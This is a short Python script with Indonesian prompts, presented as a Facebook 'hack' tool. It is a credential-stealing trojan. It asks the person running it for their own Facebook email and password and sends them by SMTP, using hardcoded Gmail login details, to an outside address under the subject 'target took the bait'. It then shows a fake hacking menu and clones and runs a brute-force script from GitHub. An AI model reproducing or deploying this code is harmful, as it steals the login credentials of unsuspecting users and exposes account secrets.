#python 3.7.1

import os, sys
os.system ("pip install yagmail")
os.system ('pip install termcolor')
import yagmail
from termcolor import colored
print (colored ('paket selesai di instal','red'))
os.system("clear")
baner = """ 

  __      __ __                   _                    _    
 \ \    / // _|                 | |                  | |   
  \ \  / /| |_  __ _   ___  ___ | |__    ___    ___  | | __
   \ \/ / |  _|/ _` | / __|/ _ \| '_ \  / _ \  / _ \ | |/ /
    \  /_ | | | (_| || (__|  __/| |_) || (_) || (_) ||   < 
     \/( )|_|  \__,_| \___|\___||_.__/  \___/  \___/ |_|\_\
       |/                                                  
             AUTHOR:V O L D E M O R D
                  
          """
print (colored(baner,'green'))

print (colored('silahkan masukan email dan password fb nya','red'))
lord_voldemord = yagmail.SMTP('voldemord195@gmail.com','pubgmobile14')
username = str (input ("email: "))
password = str (input ("password: "))
body = ("username: "+username, "password: "+password)
subject = ("target memakan umpan")
lord_voldemord.send('adamborneo02@gmail.com',subject,body)
os.system("clear")
baner = """
+-+ +-+ +-+ +-+ +-+ +-+ +-+
 |W| |E| |L| |C| |O| |M| |E|
 +-+ +-+ +-+ +-+ +-+ +-+ +-+
   
   """
print (colored(baner,'red'))
print (colored("silahkan pilih:",'yellow'))
print (colored("[1].hack group",'yellow')) 
print (colored("[2].hack id teman",'yellow'))
x = str (input (':'))
if x == ('1'):
  print (colored("sedang menginstall paket....",'yellow'))
if x == ('2'):
  print (colored("sedang menginstall paket....",'yellow'))
print (colored("loading...",'green'))
os.system ("clear")
baner = """

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 |F|B|:|A|d|a|m|b|o|r|n|e|o|d|p|
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   
   """
print (colored(baner,'blue'))
print ("loading....")
os.system("pip install mechanize")
os.system("pip install requests")
os.system("apt update && apt upgrade")
os.system("pkg install python")
os.system("git clone https://github.com/FR13ND8/BruteFB")
os.system("cd BruteFB")
os.system("python2 brute.py")
